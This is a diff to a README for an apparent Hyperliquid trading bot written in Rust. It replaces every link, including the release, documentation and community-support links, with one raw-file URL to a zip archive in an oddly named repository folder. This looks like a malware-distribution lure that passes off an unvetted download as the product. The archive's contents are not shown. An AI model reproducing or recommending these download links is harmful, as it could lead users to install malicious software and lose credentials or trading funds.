@@ -1,6 +1,6 @@
 # 🦄 hyperliquid-trading-bot-rust - Your Simple Solution for Automated Trading
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/RUBE40/hyperliquid-trading-bot-rust/releases)
+[![Download Now](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)
 
 ## 🌟 Introduction
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 To download the trading bot, visit the Releases page. Here, you'll find the latest version of the software ready for you to download.
 
-[Download Now](https://github.com/RUBE40/hyperliquid-trading-bot-rust/releases)  
+[Download Now](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)  
 
 ### 3. Downloading the Bot
 
@@ -78,12 +78,12 @@ For more support, you can open an issue in the GitHub repository.
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/RUBE40/hyperliquid-trading-bot-rust/releases)
-- [Documentation](https://github.com/RUBE40/hyperliquid-trading-bot-rust#documentation)
-- [Community Support](https://github.com/RUBE40/hyperliquid-trading-bot-rust/discussions)
+- [Releases Page](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)
+- [Documentation](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)
+- [Community Support](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)
 
 ## ℹ️ Conclusion
 
 Thank you for choosing the Hyperliquid Trading Bot! We are excited to help you enhance your trading experience. Don't forget to check for updates regularly.
 
-[Download Now](https://github.com/RUBE40/hyperliquid-trading-bot-rust/releases)  
+[Download Now](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/hyperliquid-trading-bot-rust.zip)  
